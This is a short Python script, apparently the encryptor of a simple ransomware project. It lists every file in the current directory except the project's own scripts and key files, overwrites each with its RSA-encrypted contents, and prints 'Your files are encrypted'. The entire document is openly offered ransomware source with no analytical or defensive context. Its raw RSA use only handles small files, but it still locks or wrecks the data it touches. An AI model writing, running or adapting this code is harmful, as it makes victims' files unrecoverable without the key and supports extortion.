import os
import rsa

files = [] 
for file in os.listdir():
    if file == "ransom_fixer.py" or file == "decrypter.py" or file == "encrypter.py" or file == "key_generator.py" or file == "private.pem" or file == "public.pem" or file == "ransom.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

for file in files:
    with open("public.pem", 'rb') as f:
        public_key = rsa.PublicKey.load_pkcs1(f.read())

    with open(file, 'rb') as f:
        data = f.read()


    encrytped_data = rsa.encrypt(data, public_key)


    with open(file, 'wb') as f:
         f.write(encrytped_data)

print("Your files are encrypted")
